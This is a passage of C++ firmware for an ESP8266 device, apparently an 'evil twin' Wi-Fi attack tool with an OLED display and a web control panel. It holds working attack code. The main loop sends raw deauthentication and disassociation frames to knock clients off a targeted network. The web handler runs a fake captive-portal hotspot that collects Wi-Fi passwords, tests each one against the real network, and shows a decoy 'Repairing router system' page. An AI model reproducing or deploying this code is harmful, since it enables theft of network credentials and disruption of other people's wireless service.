void handleIndex(){
  if(webServer.hasArg("ap")){
    for(int i = 0; i < 16; i++){
      if(bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")){
        _selectedNetwork = _networks[i];
        oledStatus("target: " + _selectedNetwork.ssid);
      }
    }
  }

  if(webServer.hasArg("deauth")){
    if(webServer.arg("deauth") == "start"){ deauthing_active = true;  oledStatus("deauth ON"); }
    else                                 { deauthing_active = false; oledStatus("deauth off"); }
    webServer.send(200, "text/html", panelHtml());
    return;
  }

  if(webServer.hasArg("hotspot")){
    if(webServer.arg("hotspot") == "start") startHotspot();
    else                                    stopHotspot();
    webServer.send(200, "text/html", panelHtml());
    return;
  }

  if(webServer.hasArg("stop")){
    stopAll();
    webServer.send(200, "text/html", panelHtml());
    return;
  }

  if(hotspot_active && webServer.hasArg("password")){
    _tryPassword = webServer.arg("password");
    WiFi.disconnect();
    WiFi.begin(_selectedNetwork.ssid.c_str(), _tryPassword.c_str(),
               _selectedNetwork.ch, _selectedNetwork.bssid);
    oledStatus("coba pass...");
    webServer.send(200, "text/html",
      "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
      "<script>setTimeout(function(){window.location.href='/result';},15000);</script>"
      "<body><h2>Repairing router system...</h2><p>Please wait...</p></body></html>");
    return;
  }

  if(hotspot_active){
    webServer.send(200, "text/html", loginPage());
    return;
  }

  webServer.send(200, "text/html", panelHtml());
}

// ---------------- setup / loop ---------------------------------------------
void setup(){
  Serial.begin(115200);

  if(!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)){
    Serial.println(F("SSD1306 allocation failed"));
    for(;;);
  }
  display.clearDisplay();
  display.drawBitmap(0, 0, zeroTwinBoot, 128, 64, WHITE);
  display.display();

  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  WiFi.softAPConfig(IPAddress(192,168,4,1), IPAddress(192,168,4,1), IPAddress(255,255,255,0));
  WiFi.softAP(AP_SSID, AP_PASS);
  dnsServer.start(53, "*", IPAddress(192,168,4,1));

  webServer.on("/",           handleIndex);
  webServer.on("/result",     handleResult);
  webServer.on("/api/status", handleStatus);
  webServer.onNotFound(handleIndex);      // URL deteksi HP -> panel: captive auto-buka
  webServer.begin();

  performScan();
  oledStatus("siap");
  Serial.printf("[ZT] AP %s http://192.168.4.1\n", AP_SSID);
}

void loop(){
  dnsServer.processNextRequest();
  webServer.handleClient();
  handleButtons();

  if(deauthing_active && _selectedNetwork.ssid.length() && millis() - deauth_now >= 1000){
    wifi_set_channel(_selectedNetwork.ch);
    uint8_t deauthPacket[26] = {0xC0,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
                                0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,
                                0x00,0x00,0x01,0x00};
    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
    deauthPacket[24] = 1;

    deauthPacket[0] = 0xC0;                       // deauth
    wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
    deauthPacket[0] = 0xA0;                       // disassoc
    wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
    sentFrames += 2;
    deauth_now = millis();
  }

  if(millis() - now >= 15000){ performScan(); now = millis(); }

  if(millis() - oled_now >= 1000){ oledStatus(""); oled_now = millis(); }

  if(millis() - wifinow >= 5000){ wifinow = millis(); }
  delay(2);
}
